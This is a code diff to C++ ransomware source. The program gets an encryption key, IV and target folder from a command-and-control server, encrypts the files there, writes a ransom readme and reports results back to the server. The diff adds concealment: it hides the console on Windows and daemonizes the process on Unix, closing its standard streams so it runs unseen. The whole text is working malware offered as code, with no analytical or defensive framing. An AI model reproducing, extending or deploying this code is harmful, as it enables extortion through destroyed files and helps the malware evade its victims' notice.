@@ -5,6 +5,12 @@
 #include <openssl/rand.h>
 #include <openssl/err.h>
 #include "C2CCommunication.h"
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#ifdef _WIN32
+#include <windows.h>
+#endif
 
 namespace fs = std::filesystem;
 
@@ -98,6 +104,41 @@ std::vector<unsigned char> base64Decode(const std::string& base64Data) {
     return decodedData;
 }
 
+void start(std::string directoryPath) {
+    C2CCommunication c2(C2APIURL);
+    std::map<std::string, std::string> result = c2.sendStart();
+
+    std::string uuid = result["uuid"];
+    std::string directory = result["directory"];
+    std::string base64Key = result["key"];
+    std::string base64Iv = result["iv"];
+
+    if (uuid == "" || directory == "" || base64Key == "" || base64Iv == "") {
+        return;
+    }
+
+    std::vector<unsigned char> key = base64Decode(base64Key);
+    if (key.size() != 16) {
+        return;
+    }
+
+    const std::vector<unsigned char>& iv = base64Decode(base64Iv);
+    if (iv.size() != 16) {
+        return;
+    }
+
+    try {
+        processFilesInDirectory(directoryPath + "/" + directory, key, iv);
+        writeReadme(directoryPath + "/" + directory, uuid);
+    }
+    catch (const std::exception& e) {
+        c2.sendError(uuid, e.what());
+        return;
+    }
+
+    c2.sendEnd(uuid, totalFiles, directoryPath + "/" + directory);
+}
+
 int main() {
     std::string directoryPath;
     std::string folderEncrypted;
@@ -120,38 +161,35 @@ int main() {
         return 1;
     }
 
-    C2CCommunication c2(C2APIURL);
-    std::map<std::string, std::string> result = c2.sendStart();
-
-    std::string uuid = result["uuid"];
-    std::string directory = result["directory"];
-    std::string base64Key = result["key"];
-    std::string base64Iv = result["iv"];
-
-	if (uuid == "" || directory == "" || base64Key == "" || base64Iv == "") {
+#ifdef _WIN32
+    FreeConsole();
+    start(directoryPath);
+#else
+	pid_t pid = fork();
+	if (pid > 0) { // Processo padre
+        return 0;
+	}
+	else if (pid < 0) {
 		return 1;
 	}
 
-    std::vector<unsigned char> key = base64Decode(base64Key);
-    if (key.size() != 16) {
-        return 1;
-    }
+	umask(0);
+	pid_t sid = setsid();
+	if (sid < 0) {
+		return 1;
+	}
 
-    const std::vector<unsigned char>& iv = base64Decode(base64Iv);
-    if (iv.size() != 16) {
-        return 1;
-    }
+	if ((chdir("/")) < 0) {
+		return 1;
+	}
 
-    try {
-        processFilesInDirectory(directoryPath + "/" + directory, key, iv);
-        writeReadme(directoryPath + "/" + directory, uuid);
-    }
-    catch (const std::exception& e) {
-		c2.sendError(uuid, e.what());
-        return 1;        
-    }
+	close(STDIN_FILENO);
+	close(STDOUT_FILENO);
+	close(STDERR_FILENO);
 
-    c2.sendEnd(uuid, totalFiles, directoryPath + "/" + directory);
+	start(directoryPath);
+#endif
 
+ 
     return 0;
 }
